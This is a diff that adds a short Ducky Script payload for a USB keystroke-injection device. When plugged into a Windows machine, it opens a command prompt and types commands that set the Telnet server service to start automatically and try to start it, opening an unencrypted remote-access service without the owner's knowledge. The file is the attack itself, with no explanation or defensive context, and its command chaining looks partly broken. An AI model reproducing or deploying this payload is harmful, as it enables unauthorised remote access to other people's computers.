@@ -1,0 +1,7 @@
+GUI r
+DELAY 500
+STRING cmd.exe
+ENTER
+DELAY 1000
+STRING sc config tlntsvr start= auto;net start telnet;exit
+ENTER
